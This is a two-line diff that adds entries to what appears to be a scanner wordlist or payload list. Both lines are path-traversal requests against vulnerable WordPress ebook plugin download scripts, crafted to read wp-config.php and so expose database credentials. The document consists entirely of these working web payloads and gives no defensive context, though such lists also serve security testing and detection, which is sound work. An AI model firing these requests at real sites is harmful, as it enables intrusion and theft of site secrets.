@@ -1,0 +1,2 @@
+/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php
